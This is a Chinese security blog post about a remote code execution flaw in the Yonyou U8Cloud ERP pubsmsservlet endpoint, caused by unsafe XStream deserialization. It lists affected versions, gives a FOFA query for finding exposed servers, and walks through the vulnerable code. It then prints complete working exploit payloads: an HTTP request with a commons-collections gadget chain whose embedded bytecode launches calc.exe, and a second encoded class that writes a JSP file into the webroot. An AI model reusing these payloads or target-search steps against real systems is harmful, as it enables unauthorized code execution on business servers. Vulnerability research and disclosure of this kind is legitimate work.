---
title: "用友U8Cloud pubsmsservlet 远程代码执行漏洞"
source: https://mrxn.net/jswz/yonyou-pubsmsservlet-xstream-rce.html
asset_dir: assets/用友u8cloud-pubsmsservlet-远程代码执行漏洞
---

# 用友U8Cloud pubsmsservlet 远程代码执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/15 12:12
- 2745浏览
- [4评论](#comment)
- 1小时阅读

深入探索

安全

企业资源计划

软件

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B) U8Cloud 是用友网络科技股份有限公司推出的新一代云ERP解决方案，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。U8Cloud所有版本提供的pubsmsservlet接口，服务端对接收的数据进行反序列化操作时未对数据进行有效的校验，导致攻击者可发送精心构造的恶意序列化对象，在服务端[执行任意代码](https://mrxn.net/tag/rce)。

# 影响版本

用友U8Cloud V2.0版本

漏洞扫描服务

用友U8Cloud V2.1版本

用友U8Cloud V2.3版本

用友U8Cloud V2.5版本

用友U8Cloud V2.6版本

用友U8Cloud V2.7版本

用友U8Cloud V2.65版本

用友U8Cloud V3.0版本

用友U8Cloud V3.1版本

用友U8Cloud V3.2版本

用友U8Cloud V3.5版本

企业资源规划

用友U8Cloud V3.6版本

用友U8Cloud V3.6sp版本

用友U8Cloud V5.0版本

用友U8Cloud V5.0sp版本

用友U8Cloud V5.1版本

用友U8Cloud V5.1sp版本

# fofa语法

> app="用友-U8-Cloud"

# 漏洞分析

根据官网漏洞通告

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-001-0fa12c2b645a.webp)](https://image.mrxn.net/7dba9e656fc241b0816e1b7084fd4058.webp)

可知漏洞点在**pubsmsservlet**接口，那就利用之前的方法，找一下这个接口在那个jar包里，最终在

`pubuapplatform.jar` 找到了**pubsmsservlet**的实现方法

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-002-03474f3b894e.webp)](https://image.mrxn.net/148d6f904e354be8aa62d0fd4d9b3824.webp)

关键点在下面的`Object pubmsg = xs.fromXML(xmlString);` 直接反序列化`request.getInputStream();`的内容，因此就造成了XStream反序列化[代码执行](https://mrxn.net/tag/rce)漏洞了。

技术参考信息

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-003-ebab3e5daffc.webp)](https://image.mrxn.net/5dfed06aae924590bba431f16b489c6c.webp)

# 漏洞复现

```
POST /service/pubsmsservlet HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

<org.apache.commons.collections4.bag.TreeBag serialization="custom">
  <unserializable-parents>
    <size>2</size>
  </unserializable-parents>
  <org.apache.commons.collections4.bag.TreeBag>
    <default/>
    <org.apache.commons.collections4.comparators.TransformingComparator>
      <decorated class="org.apache.commons.collections4.comparators.ComparableComparator"/>
      <transformer class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InstantiateTransformer>
            <iParamTypes>
              <java-class>javax.xml.transform.Templates</java-class>
            </iParamTypes>
            <iArgs>
              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization="custom">
                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                  <default>
                    <__name>a</__name>
                    <__bytecodes>
                      <byte-array>yv66vgAAADQAGQEAAWkHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAKAAsKAAkADAEACGNhbGMuZXhlCAAOAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEAARCgAJABIBAAY8aW5pdD4MABQABgoABAAVAQAKU291cmNlRmlsZQEABmkuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAY</byte-array>
                    </__bytecodes>
                    <__transletIndex>-1</__transletIndex>
                    <__indentNumber>0</__indentNumber>
                  </default>
                  <boolean>false</boolean>
                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
              </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
            </iArgs>
          </org.apache.commons.collections4.functors.InstantiateTransformer>
        </iTransformers>
      </transformer>
    </org.apache.commons.collections4.comparators.TransformingComparator>
    <int>1</int>
    <int>1</int>
    <int>2</int>
  </org.apache.commons.collections4.bag.TreeBag>
</org.apache.commons.collections4.bag.TreeBag>
```

这里弹个计算器吧，证明下吧!

漏洞扫描服务

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-004-8f26b56bb97b.webp)](https://image.mrxn.net/7f09c9d6ba2444c1a131731da5a35a07.webp)

当然，写文件也是可以的，如下payload会在`C:\U8CERP\webapps\u8c_web\mx.jsp` 写入文件，可自行修改

```
yv66vgAAADQARAoADQAyCAAzCAA0BwA1CgAEADYHADcKAAYAOAoABgA5CgAGADoKAAQAOgcAOwcAPAcAPQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATTHB1YnNtc3NlcnZsZXRfZXhwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA+AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAAhmaWxlUGF0aAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAC2ZpbGVDb250ZW50AQAKZmlsZVdyaXRlcgEAFExqYXZhL2lvL0ZpbGVXcml0ZXI7AQALcHJpbnRXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAA1TdGFja01hcFRhYmxlBwA7AQAKU291cmNlRmlsZQEAFnB1YnNtc3NlcnZsZXRfZXhwLmphdmEMAA4ADwEAIEM6XFU4Q0VSUFx3ZWJhcHBzXHU4Y193ZWJcbXguanNwAQCFPCVvdXQucHJpbnRsbihqYXZhLnV0aWwuVVVJRC5yYW5kb21VVUlEKCkudG9TdHJpbmcoKSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPgEAEmphdmEvaW8vRmlsZVdyaXRlcgwADgA/AQATamF2YS9pby9QcmludFdyaXRlcgwADgBADABBAEIMAEMADwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFwdWJzbXNzZXJ2bGV0X2V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABYoTGphdmEvbGFuZy9TdHJpbmc7WilWAQATKExqYXZhL2lvL1dyaXRlcjspVgEABXByaW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFY2xvc2UAIQAMAA0AAAAAAAUAAQAOAA8AAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAAJABIAAAAMAAEAAAAFABMAFAAAAAEAFQAWAAIAEAAAAD8AAAADAAAAAbEAAAACABEAAAAGAAEAAAAjABIAAAAgAAMAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAGQAaAAIAGwAAAAQAAQAcAAEAFQAdAAIAEAAAAEkAAAAEAAAAAbEAAAACABEAAAAGAAEAAAAoABIAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHgAfAAIAAAABACAAIQADABsAAAAEAAEAHAAJACIAIwABABAAAAArAAAAAQAAAAGxAAAAAgARAAAABgABAAAALQASAAAADAABAAAAAQAkACUAAAAIACYADwABABAAAACsAAQABAAAACsSAksSA0y7AARZKgO3AAVNuwAGWSy3AAdOLSu2AAgttgAJLLYACqcABEuxAAEAAAAmACkACwADABEAAAAqAAoAAAAOAAMADwAGABMAEAAUABkAFQAeABYAIgAXACYAHAApABkAKgAdABIAAAAqAAQAAwAjACcAKAAAAAYAIAApACgAAQAQABYAKgArAAIAGQANACwALQADAC4AAAAHAAJpBwAvAAABADAAAAACADE=
```

写入D盘的目录只需将EM6改为EQ6即可

访问写入文件,成功[执行代码](https://mrxn.net/tag/rce)

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-005-01486e3161e3.webp)](https://image.mrxn.net/ce138f4544624db7b82cddb0803da451.webp)

也可以使用Java chains如下链来生成命令执行回显等探测

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-006-d7103f43e25c.webp)](https://image.mrxn.net/212398998b894186b602bd42db9186f5.webp)

关键点是调用 jacksontostring链子来进行利用。

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-007-71259e5c34b7.webp)](https://image.mrxn.net/d159862de79a4d40bb4ddb8da8aa0318.webp)

执行命令后，访问根目录下的xx.txt即可得到命令执行结果

[![用友U8Cloud pubsmsservlet 远程代码执行漏洞](images/img-008-fa7fea9e10f1.webp)](https://image.mrxn.net/0ea413f309db4141bad301b5466c2eaf.webp)

# 参考

- [关于U8cloud所有版本pubsmsservlet接口存在反序列化漏洞的安全公告](https://security.yonyou.com/#/noticeInfo?id=742)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
